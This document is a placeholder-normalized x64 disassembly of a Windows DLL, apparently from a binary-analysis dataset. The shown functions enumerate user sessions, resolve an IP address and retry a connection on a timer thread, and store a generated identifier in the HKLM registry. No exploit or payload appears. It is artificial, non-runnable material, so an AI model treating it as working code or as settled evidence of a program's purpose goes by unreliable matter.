sub_1800172a0
test rcx rcx
je r-xdata
retn
push rdi
sub rsp 0x20
lea eax [ rdx + 0x1 ]
mov rdi rcx
cmp eax 0x13
jb r-xdata
add rsp 0x20
pop rdi
call sub_180018e40
test eax eax
jne r-xdata
mov eax 0x501
cmp [ rdi + 0x4 ] ax
jne r-xdata
mov rcx rdi
add rsp 0x20
pop rdi
jmp sub_180019530
mov eax [ rdi + 0x6 ]
cmp eax 0x3f800
jbe r-xdata
mov r8d [ rdi + 0xa ]
lea rcx [ rw-data ]
mov rdx rdi
add r8d 0x13
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] eax
call sub_180019630
lea rdx [ rsp + 0x30 ]
lea rcx [ rw-data ]
call sub_180019700
mov rsi rax
test rax rax
je r-xdata
mov rsi [ rsp + 0x40 ]
mov ecx [ rsp + 0x30 ]
mov [ rsp + 0x38 ] rbx
add rcx 0x12
call j_sub_18000ca24
mov rcx [ rdi ]
mov rdx rsi
mov [ rax ] rcx
mov rcx [ rdi + 0x8 ]
mov rbx rax
mov [ rax + 0x8 ] rcx
movzx ecx [ rdi + 0x10 ]
mov [ rax + 0x10 ] cx
movzx ecx [ rdi + 0x12 ]
mov [ rax + 0x12 ] cl
mov ecx [ rsp + 0x30 ]
mov [ rax + 0xa ] ecx
mov r8d [ rsp + 0x30 ]
lea rcx [ rax + 0x12 ]
call sub_18000c440
mov rcx rbx
call sub_180019530
mov rcx rbx
call j_sub_18000ec1c#2
mov rbx [ rsp + 0x38 ]
sub_1800173a0
mov r11 rsp
sub rsp 0x198
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x170 ] rax
mov [ r11 - 0x8 ] rsi
mov [ r11 - 0x10 ] rdi
mov [ r11 - 0x18 ] r12
mov r12 rcx
lea rcx [ rw-data ]
mov r8d 0x180
mov rdx r12
call sub_18000c440
call sub_180019580
lea rcx [ rw-data ]
xor edx edx
mov r8d 0xb4
call sub_18000bd10
lea rax [ j_sub_180017610 ]
mov [ rw-data ] 0x0
mov [ r12 + 0x178 ] rax
mov [ rw-data ] rax
call sub_180017ac0
xor r9d r9d
lea edx [ r9 + 0x3c ]
lea r8d [ r9 + 0x3 ]
lea ecx [ rdx - 0x1e ]
call sub_1800176d0
lea r8 [ j_sub_180018b70 ]
lea rdx [ sub_1800172a0 ]
lea rcx [ sub_180017070 ]
call sub_180017990
lea rcx [ sub_180016f90 ]
mov edx 0x2
call sub_180017f20
xor edx edx
lea rcx [ rsp + 0x31 ]
lea r8d [ rdx + 0x63 ]
mov [ rsp + 0x30 ] 0x0
call sub_18000bd10
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r12
lea esi [ rax + 0x50 ]
[ rdi ]
not rcx
dec rcx
cmp rcx 0x7
jb r-xdata
lea rcx [ rsp + 0xa1 ]
xor edx edx
mov r8d 0xc7
mov [ rsp + 0xa0 ] 0x0
call sub_18000bd10
lea rdx [ rw-data ]
lea rcx [ rsp + 0xa0 ]
mov r8d 0x64
call sub_18000be10
lea rcx [ rsp + 0xa0 ]
mov edx 0x3a
call sub_18000c334
mov r12 [ rsp + 0x180 ]
mov rdi [ rsp + 0x188 ]
test rax rax
je r-xdata
lea r8d [ rax + 0x64 ]
lea rcx [ rsp + 0x30 ]
mov rdx r12
mov [ rsp + 0x1a8 ] rbx
mov [ rw-data ] 0x1
mov [ rsp + 0x1b0 ] rbp
call sub_18000be10
lea edx [ rsi - 0x16 ]
lea rcx [ rsp + 0x30 ]
call sub_18000c334
test rax rax
jne r-xdata
lea rcx [ rsp + 0xa0 ]
movzx edx si
call sub_180017b50
mov rsi [ rsp + 0x190 ]
test eax eax
jne r-xdata
lea rcx [ rax + 0x1 ]
mov [ rax ] 0x0
call sub_180015ce4
mov esi eax
lea rcx [ rax + 0x1 ]
mov [ rax ] 0x0
call sub_180015ce4
mov ebp eax
mov ebp esi
jmp r-xdata
mov rcx [ rsp + 0x170 ]
xor rcx rsp
call sub_18000c060
add rsp 0x198
retn
inc [ rw-data ]
lea rdx [ r12 + 0x64 ]
lea rcx [ rw-data ]
mov r8d 0x1f
call sub_18000be10
lea rdi [ r12 + 0x84 ]
lea rcx [ rw-data ]
mov rdx rdi
mov r8d 0x1f
call sub_18000be10
lea rdx [ rsp + 0x30 ]
lea rcx [ rw-data ]
mov r8d 0x63
call sub_18000be10
lea r9 [ r12 + 0x64 ]
lea rdx [ rsp + 0x30 ]
movzx r8d bp
mov ecx 0x1
mov [ rw-data ] bp
mov [ rsp + 0x20 ] rdi
call sub_180017a50
mov rbp [ rsp + 0x1b0 ]
mov rbx [ rsp + 0x1a8 ]
sub_180017610
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
add rsp 0x28
retn
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov ecx [ rw-data ]
call sub_18001cc60
mov ecx [ rw-data ]
call sub_18001c910
call sub_1800197c0
call sub_180019c60
call sub_18001c890
xor eax eax
mov [ rw-data ] 0x0
mov [ rw-data ] rax
mov [ rw-data ] rax
mov [ rw-data ] rax
mov [ rw-data ] rax
mov edx 0x1f9
mov [ rw-data ] 0x1
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov rcx [ rw-data ]
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x0
mov rcx [ rw-data ]
mov edx 0xfffffffe
call [ TerminateThread@IAT ]
sub_1800176d0
push rbx
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
jne r-xdata
mov ecx [ rw-data ]
mov r8d edx
mov edx 0x2
call sub_18001cef0
mov r11d eax
test eax eax
jne r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
xor eax eax
test r11d r11d
sete al
add rsp 0x20
pop rbx
retn
mov ecx [ rw-data ]
lea edx [ rax + 0x1 ]
mov r8d ebx
call sub_18001cef0
mov r11d eax
sub_180017730
test rcx rcx
je r-xdata
retn
push rdi
sub rsp 0x460
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rsp + 0x470 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x450 ] rax
mov rax [ rcx ]
mov [ rw-data ] rax
mov rax [ rcx + 0x8 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x10 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x18 ]
mov [ rw-data ] rax
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rsp + 0x450 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x470 ]
add rsp 0x460
pop rdi
lea rcx [ rsp + 0x20 ]
call sub_18000a530
nop
lea rcx [ rsp + 0x20 ]
call sub_18000a7b0
xor edx edx
mov r8d 0x3ff
lea rcx [ rsp + 0x51 ]
call sub_18000bd10
mov [ rsp + 0x50 ] 0x81000
mov [ rsp + 0x58 ] 0x30000
mov r8d 0xc
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_18000a620
xor edx edx
mov r8d 0x400
lea rcx [ rsp + 0x50 ]
call sub_18000bd10
mov [ rsp + 0x50 ] 0x81000
mov eax [ rw-data ]
mov [ rsp + 0x54 ] eax
movzx eax [ rw-data ]
mov [ rsp + 0x58 ] ax
mov [ rsp + 0x5a ] 0x1
mov r8d 0xc
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
call sub_18000a620
call [ rw-data ]
nop
lea rcx [ rsp + 0x20 ]
call sub_18000a5f0
sub_1800178b0
sub rsp 0x28
mov r9 rdx
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
mov [ rw-data ] rax
mov rax [ rcx + 0x8 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x10 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x18 ]
mov [ rw-data ] rax
mov rax [ rw-data ]
test rax rax
je r-xdata
mov edx r8d
mov rcx r9
call rax
sub_180017900
sub rsp 0x28
test rcx rcx
je r-xdata
add rsp 0x28
retn
mov rax [ rcx ]
mov [ rw-data ] rax
mov rax [ rcx + 0x8 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x10 ]
mov [ rw-data ] rax
mov rax [ rcx + 0x18 ]
mov [ rw-data ] rax
mov rax [ rw-data ]
test rax rax
je r-xdata
call rax
sub_180017950
sub rsp 0x28
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x28
retn
cmp [ rw-data ] 0x0
je r-xdata
mov r8d [ rcx + 0xa ]
mov rdx rcx
mov ecx [ rw-data ]
add r8d 0x12
xor r9d r9d
call sub_18001ca70
xor ecx ecx
test eax eax
sete cl
mov eax ecx
add rsp 0x28
retn
sub_1800179c0
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
call sub_18001cc60
xor ecx ecx
test eax eax
sete cl
mov eax ecx
add rsp 0x28
retn
mov eax 0x1
add rsp 0x28
retn
sub_1800179f0
sub rsp 0x48
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x38 ] rax
mov eax [ rw-data ]
mov [ rsp + 0x30 ] eax
call sub_18001cd10
test eax eax
jne r-xdata
xor eax eax
add rsp 0x48
retn
mov eax [ rsp + 0x20 ]
mov [ rw-data ] eax
add rsp 0x48
retn
sub_180017a50
sub rsp 0x38
mov r10 rdx
test rdx rdx
je r-xdata
xor eax eax
add rsp 0x38
retn
cmp r8w 0x1
jb r-xdata
mov [ rsp + 0x30 ] rbx
xor ebx ebx
mov edx ebx
cmp ecx 0x1
je r-xdata
mov edx 0x1
cmp ecx 0x2
jne r-xdata
mov rax [ rsp + 0x60 ]
mov ecx [ rw-data ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r9
movzx r9d r8w
mov r8 r10
call sub_18001cff0
test eax eax
sete bl
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x38
retn
sub_180017ac0
sub rsp 0x38
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0x1
add rsp 0x38
retn
call sub_18001c840
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_18001c8c0
test eax eax
jne r-xdata
xor eax eax
add rsp 0x38
retn
mov ecx [ rw-data ]
mov [ rw-data ] eax
lea rax [ sub_180017870 ]
lea r9 [ sub_180017900 ]
lea r8 [ sub_1800178b0 ]
lea rdx [ sub_180017730 ]
mov [ rsp + 0x20 ] rax
call sub_18001cc90
mov ecx [ rw-data ]
xor edx edx
lea r8d [ rdx + 0x5 ]
call sub_18001cef0
call sub_180019c10
call sub_180019770
mov [ rw-data ] 0x1
sub_180017b50
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movzx edi dx
mov rbx rcx
test rcx rcx
jne r-xdata
call [ inet_addr@IAT ]
cmp eax 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
mov [ rw-data ] eax
mov rax [ rw-data ]
mov [ rw-data ] di
mov edi ebx
test rax rax
je r-xdata
xor edx edx
lea rcx [ rsp + 0x21 ]
mov [ rsp + 0x20 ] 0x0
lea r8d [ rdx + 0x63 ]
call sub_18000bd10
lea r8 [ rsp + 0x20 ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18001a180
lea rcx [ rsp + 0x20 ]
call [ inet_addr@IAT ]
cmp eax 0xffffffff
je r-xdata
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0xc0 ]
add rsp 0xa0
pop rdi
retn
lea rcx [ rw-data ]
call sub_18001c950
mov edi eax
call rax
test eax eax
je r-xdata
test edi edi
sete bl
mov eax ebx
sub_180017c20
sub rsp 0x308
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2f0 ] rax
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov [ rsp + 0x300 ] rbx
xor ebx ebx
cmp [ rw-data ] 0x5
mov [ rw-data ] bx
jb r-xdata
xor eax eax
mov rcx [ rsp + 0x2f0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x308
retn
movzx r9d [ rw-data ]
cmp ecx 0x1
jne r-xdata
inc ecx
mov eax 0xaaaaaaab
mov [ rw-data ] ebx
mul ecx
shr edx 0x1
imul edx edx 0xfffffffd
add ecx edx
mov [ rw-data ] ecx
test ecx ecx
je r-xdata
test r9w r9w
jne r-xdata
lea rcx [ rsp + 0x111 ]
xor edx edx
mov r8d 0xc7
mov [ rsp + 0x110 ] bl
call sub_18000bd10
lea rdx [ rsp + 0x110 ]
lea rcx [ rw-data ]
call sub_180016f20
lea rcx [ rsp + 0x110 ]
movzx edx ax
call sub_180017b50
dec ecx
je r-xdata
cmp [ rw-data ] bl
mov eax 0x2
cmove ecx eax
mov [ rw-data ] ecx
lea r8 [ rw-data ]
test r8 r8
je r-xdata
dec ecx
jne r-xdata
cmp r9w 0x1
jb r-xdata
lea rcx [ rsp + 0x1e1 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x1e0 ] bl
call sub_18000bd10
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x1e0 ]
mov [ rsp + 0x30 ] 0x103
call sub_18001a5e0
test eax eax
je r-xdata
lea rax [ rw-data ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov [ rw-data ] 0x5
xor eax eax
jmp r-xdata
lea rcx [ rsp + 0x41 ]
xor edx edx
mov r8d 0xc7
mov [ rsp + 0x40 ] bl
call sub_18000bd10
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x1e0 ]
call sub_180016f20
lea rcx [ rsp + 0x40 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x300 ]
mov rcx [ rsp + 0x2f0 ]
xor rcx rsp
call sub_18000c060
add rsp 0x308
retn
cmp ax 0x1
jb r-xdata
mov [ rsp + 0x28 ] rbx
movzx r9d ax
lea r8 [ rsp + 0x40 ]
mov [ rsp + 0x20 ] rbx
jmp r-xdata
mov ecx [ rw-data ]
mov edx 0x1
call sub_18001cff0
sub_180017e10
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x40
imul ecx ecx 0x3e8
call [ Sleep@IAT ]
mov esi [ rw-data ]
mov eax 0x5
cmp esi eax
cmovb esi eax
xor ebp ebp
mov ebx ebp
imul esi esi 0x3e8
cmp [ rw-data ] ebx
jne r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
xor eax eax
add rsp 0x40
pop rsi
retn
mov [ rsp + 0x50 ] rdi
nop [ rax + rax ] ax
cmp ebx esi
jae r-xdata
call r11
mov ebx ebp
add ebx 0x7d0
jne r-xdata
cmp [ rw-data ] ebp
je r-xdata
call rax
mov edi eax
cmp [ rw-data ] ebp
je r-xdata
jmp r-xdata
test edi edi
je r-xdata
xor eax eax
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbp
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x38 ] rax
mov eax [ rw-data ]
mov [ rsp + 0x30 ] eax
call sub_18001cd10
test eax eax
jne r-xdata
mov ecx 0x7d0
call [ Sleep@IAT ]
mov r11 [ rw-data ]
test r11 r11
je r-xdata
mov rdi [ rsp + 0x50 ]
mov rax [ rw-data ]
mov edi 0x1
test rax rax
je r-xdata
inc [ rw-data ]
call sub_180017c20
mov eax [ rsp + 0x20 ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
sub_180017f20
sub rsp 0x38
cmp [ rw-data ] 0x0
jne r-xdata
add rsp 0x38
retn
xor eax eax
mov [ rw-data ] rcx
mov r9d edx
mov [ rsp + 0x28 ] rax
lea r8 [ sub_180017e10 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] eax
call sub_18001baa8
mov [ rw-data ] rax
sub_180017f60
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push rbp
lea rbp [ rsp - 0x430 ]
sub rsp 0x530
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x420 ] rax
xor esi esi
lea rax [ rsp + 0x38 ]
mov rdi rdx
mov ebx ecx
lea r9 [ rsp + 0x30 ]
lea r8d [ rsi + 0x1 ]
xor edx edx
xor ecx ecx
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] esi
mov [ rsp + 0x20 ] rax
call WTSEnumerateSessionsA
test eax eax
je r-xdata
xor eax eax
mov edx [ rsp + 0x38 ]
mov ecx esi
test edx edx
je r-xdata
mov r9 [ rsp + 0x30 ]
mov rax r9
mov eax ecx
lea rcx [ rdi + 0x4 ]
mov r8d 0x1f
lea rbx [ rax + rax * 2 ]
mov eax [ r9 + rbx * 8 ]
mov [ rdi ] eax
mov rdx [ r9 + rbx * 8 + 0x8 ]
call sub_18000be10
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x48 ] esi
mov edx [ rax + rbx * 8 ]
lea r9 [ rsp + 0x40 ]
mov r8d 0xa
xor ecx ecx
call WTSQuerySessionInformationA
test eax eax
je r-xdata
inc ecx
add rax 0x18
cmp ecx edx
jb r-xdata
lea rax [ rsp + 0x58 ]
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] esi
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x30 ]
lea r9 [ rsp + 0x50 ]
mov edx [ rax + rbx * 8 ]
mov r8d 0x5
xor ecx ecx
call WTSQuerySessionInformationA
test eax eax
je r-xdata
mov rdx [ rsp + 0x40 ]
lea rcx [ rdi + 0x64 ]
mov r8d 0x3f
call sub_18000be10
mov rcx [ rsp + 0x40 ]
call WTSFreeMemory
cmp [ rax ] ebx
je r-xdata
xor eax eax
lea rcx [ rbp - 0x58 ]
xor edx edx
mov r8d 0x478
mov [ rsp + 0x60 ] sil
mov [ rsp + 0x61 ] rax
mov [ rsp + 0x69 ] rax
mov [ rsp + 0x71 ] rax
mov [ rsp + 0x79 ] rax
mov [ rbp - 0x7f ] rax
mov [ rbp - 0x77 ] rax
mov [ rbp - 0x6f ] rax
mov [ rbp - 0x67 ] rax
mov [ rbp - 0x5f ] eax
mov [ rbp - 0x5b ] ax
mov [ rbp - 0x59 ] al
call sub_18000bd10
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x3c ] esi
mov ebx [ rax + rbx * 8 ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rcx rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rdx [ rsp + 0x50 ]
lea rcx [ rdi + 0x24 ]
mov r8d 0x3f
call sub_18000be10
mov rcx [ rsp + 0x50 ]
call WTSFreeMemory
mov eax 0x1
jmp r-xdata
mov rax [ rw-data ]
test rax rax
jne r-xdata
mov rcx [ rbp + 0x420 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x530 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
lea rcx [ rsp + 0x3c ]
lea r9 [ rsp + 0x60 ]
mov r8d 0x8
mov [ rsp + 0x28 ] rcx
xor ecx ecx
mov edx ebx
mov [ rsp + 0x20 ] 0x4c0
call rax
test eax eax
je r-xdata
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
lea rcx [ rdi + 0xa4 ]
call [ GetLocalTime@IAT ]
sub_1800181a0
sub rsp 0x28
mov rax [ rw-data ]
test rax rax
jne r-xdata
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rcx [ rw-data ]
lea rdx [ r--data ]
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
cmp [ rw-data ] 0x0
mov [ rw-data ] rax
je r-xdata
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
xor eax eax
add rsp 0x28
retn
test rax rax
je r-xdata
mov eax 0x1
add rsp 0x28
retn
sub_180018220
push rsi
sub rsp 0x320
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x308 ] rax
mov rsi rcx
mov ecx [ r--data ]
mov [ rsi ] ecx
movzx ecx [ r--data ]
mov [ rsi + 0x4 ] cx
call sub_1800181a0
test eax eax
je r-xdata
mov rax rsi
mov rcx [ rsp + 0x308 ]
xor rcx rsp
call sub_18000c060
add rsp 0x320
pop rsi
retn
mov [ rsp + 0x338 ] rbx
lea rdx [ rsp + 0x20 ]
lea rcx [ rsp + 0x30 ]
xor ebx ebx
mov [ rsp + 0x20 ] ebx
call [ rw-data ]
cmp eax 0x6f
jne r-xdata
mov rbx [ rsp + 0x338 ]
mov [ rsp + 0x340 ] rbp
mov [ rsp + 0x318 ] rdi
mov edi [ rsp + 0x20 ]
call [ GetProcessHeap@IAT ]
mov r8d edi
xor edx edx
mov rcx rax
call [ HeapAlloc@IAT ]
mov rbp rax
test rax rax
je r-xdata
mov rbp [ rsp + 0x340 ]
mov rdi [ rsp + 0x318 ]
lea rdx [ rsp + 0x20 ]
mov rcx rax
call [ rw-data ]
test eax eax
jne r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbp
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov [ rsi ] bl
cmp [ rbp + 0x194 ] ebx
jbe r-xdata
mov [ rsp + 0x310 ] r12
lea r12 [ rbp + 0x198 ]
nop [ rax ] eax
movzx eax [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
inc ebx
inc r12
cmp ebx [ rbp + 0x194 ]
jb r-xdata
xor eax eax
lea r8 [ r--data ]
lea rcx [ rsp + 0x2f0 ]
mov [ rsp + 0x2f0 ] rax
mov [ rsp + 0x2f8 ] rax
mov [ rsp + 0x300 ] eax
movzx r9d [ r12 ]
lea edx [ rax + 0x13 ]
call sub_18000cac8
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
lea rdx [ rsp + 0x2f0 ]
[ rdi ]
xor ecx ecx
nop [ rax + rax ] ax
mov r12 [ rsp + 0x310 ]
sub_1800183b0
push rdi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
xor eax eax
xor r8d r8d
mov r9 rdx
mov r10 rcx
mov [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x20 ]
mov ecx r8d
mov [ rsp + 0x21 ] rax
mov [ rsp + 0x29 ] rax
mov [ rsp + 0x31 ] rax
nop [ rax ] eax
lea eax [ rcx + 0x41 ]
inc ecx
inc rdx
mov [ rdx - 0x1 ] al
cmp ecx 0x19
jl r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r10
[ rdi ]
mov [ rsp ] r8b
mov [ rsp + 0x1 ] rax
not rcx
mov [ rsp + 0x9 ] rax
mov [ rsp + 0x11 ] rax
dec rcx
cmp ecx 0x19
jne r-xdata
movsxd rdi ecx
cmp ecx 0x19
mov rdx r8
mov rcx r8
jge r-xdata
mov rax [ r10 ]
mov [ rsp ] rax
mov rax [ r10 + 0x8 ]
mov [ rsp + 0x8 ] rax
mov rax [ r10 + 0x10 ]
mov [ rsp + 0x10 ] rax
movzx eax [ r10 + 0x18 ]
mov [ rsp + 0x18 ] al
jmp r-xdata
test rdi rdi
jle r-xdata
nop [ rax + rax ] eax
mov r10 r8
nop
nop [ rax + rax ] ax
cmp rcx rdi
cmove rcx r8
inc rdx
movzx eax [ rcx + r10 ]
inc rcx
mov [ rsp + rdx - 0x1 ] al
cmp rdx 0x19
jl r-xdata
jmp r-xdata
movzx eax [ rsp + r10 + 0x20 ]
movzx edi [ rsp + r10 ]
inc r8d
add edi eax
mov eax 0x4ec4ec4f
inc r9
inc r10
mul edi
shr edx 0x3
mov al 0x1a
imul dl
sub dil al
add dil 0x41
mov [ r9 - 0x1 ] dil
cmp r8d 0x19
jl r-xdata
test r8d r8d
je r-xdata
movzx eax [ rdx + r10 ]
cmp rcx 0x19
cmove rcx r8
inc rdx
add [ rsp + rcx ] al
inc rcx
cmp rdx rdi
jl r-xdata
mov eax 0x66666667
imul r8d
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
lea ecx [ rdx + rdx * 4 ]
cmp r8d ecx
jne r-xdata
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18000c060
add rsp 0x50
pop rdi
retn
mov [ r9 ] 0x2d
inc r9
sub_180018520
push rbx
sub rsp 0x30
lea r8 [ rsp + 0x58 ]
lea rdx [ r--data ]
xor ebx ebx
mov rcx 0xffffffff80000002
mov [ rsp + 0x58 ] rbx
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x58 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x40 ] rdi
mov [ rsp + 0x28 ] rax
lea rdi [ rw-data ]
lea r9 [ rsp + 0x48 ]
lea rdx [ r--data ]
xor r8d r8d
mov [ rsp + 0x48 ] 0x1
mov [ rsp + 0x20 ] rdi
mov [ rsp + 0x50 ] 0x32
call [ RegQueryValueExA@IAT ]
mov rcx [ rsp + 0x58 ]
test eax eax
je r-xdata
xor eax eax
add rsp 0x30
pop rbx
retn
call [ RegCloseKey@IAT ]
cmp [ rsp + 0x48 ] 0x1
jne r-xdata
call [ RegCloseKey@IAT ]
xor eax eax
mov rdi [ rsp + 0x40 ]
add rsp 0x30
pop rbx
retn
or rcx 0xffffffffffffffff
xor eax eax
[ rdi ]
mov rdi [ rsp + 0x40 ]
not rcx
dec rcx
cmp rcx 0x1d
sete bl
mov eax ebx
add rsp 0x30
pop rbx
retn
sub_1800185f0
push rbx
sub rsp 0x30
mov rbx rcx
lea r8 [ rsp + 0x48 ]
lea rdx [ r--data ]
mov rcx 0xffffffff80000002
mov [ rsp + 0x48 ] 0x0
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
add rsp 0x30
pop rbx
retn
or rcx 0xffffffffffffffff
xor eax eax
mov [ rsp + 0x40 ] rdi
mov rdi rbx
lea rdx [ r--data ]
lea r9d [ rax + 0x1 ]
[ rdi ]
xor r8d r8d
not rcx
dec rcx
mov [ rsp + 0x28 ] ecx
mov rcx [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rbx
call [ RegSetValueExA@IAT ]
mov rcx [ rsp + 0x48 ]
call [ RegCloseKey@IAT ]
mov rdi [ rsp + 0x40 ]
sub_180018670
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x430
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x420 ] rax
mov rbx rcx
or rcx 0xffffffffffffffff
lea rsi [ rw-data ]
xor eax eax
mov rdi rsi
[ rdi ]
not rcx
dec rcx
mov rcx rsi
je r-xdata
xor edx edx
lea r8d [ rdx + 0x64 ]
call sub_18000bd10
mov rcx rsi
call sub_180018520
test eax eax
je r-xdata
sub rbx rsi
nop [ rax + rax ] ax
xor edx edx
mov rcx rsi
lea r8d [ rdx + 0x64 ]
call sub_18000bd10
lea rcx [ rsp + 0xf1 ]
xor edx edx
mov r8d 0x12b
mov [ rsp + 0xf0 ] 0x0
call sub_18000bd10
lea rcx [ rsp + 0xf0 ]
call sub_180018220
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0xc7
mov [ rsp + 0x20 ] 0x0
call sub_18000bd10
call sub_18001ace0
lea rdx [ rsp + 0x20 ]
sub rdx rax
nop
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rsi
[ rdi ]
not rcx
dec rcx
je r-xdata
movzx eax [ rcx ]
inc rcx
mov [ rbx + rcx - 0x1 ] al
test al al
jne r-xdata
jmp r-xdata
movzx ecx [ rax ]
inc rax
mov [ rdx + rax - 0x1 ] cl
test cl cl
jne r-xdata
mov [ rsp + 0x220 ] cl
lea rcx [ rsp + 0x221 ]
xor edx edx
mov r8d 0x1f3
call sub_18000bd10
xor edx edx
nop [ rax ] eax
mov rcx rsi
sub rbx rsi
nop [ rax + rax ] ax
mov rax rsi
mov rcx [ rsp + 0x420 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x430 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
movzx eax [ rsp + rdx + 0xf0 ]
inc rdx
mov [ rsp + rdx + 0x21f ] al
test al al
jne r-xdata
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rsp + 0x220 ]
[ rdi ]
xor ecx ecx
lea rdx [ rsp + 0x20 ]
nop [ rax ] eax
movzx eax [ rcx ]
inc rcx
mov [ rbx + rcx - 0x1 ] al
test al al
jne r-xdata
jmp r-xdata
movzx eax [ rdx + rcx ]
inc rcx
mov [ rdi + rcx - 0x2 ] al
test al al
jne r-xdata
lea rcx [ rsp + 0x220 ]
mov rdx rbx
call sub_1800183b0
mov rdx rsi
sub rdx rbx
nop [ rax + rax ] ax
movzx ecx [ rbx ]
inc rbx
mov [ rdx + rbx - 0x1 ] cl
test cl cl
jne r-xdata
mov rcx rsi
call sub_1800185f0
sub_180018850
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
jne r-xdata
mov [ rsp + 0x30 ] rdi
call [ GetProcessHeap@IAT ]
mov edx 0x8
lea r8d [ rdx + 0x1f ]
mov rcx rax
call [ HeapAlloc@IAT ]
mov rdi rax
mov eax 0x602
mov [ rdi + 0x4 ] ax
mov [ rdi + 0xa ] 0x14
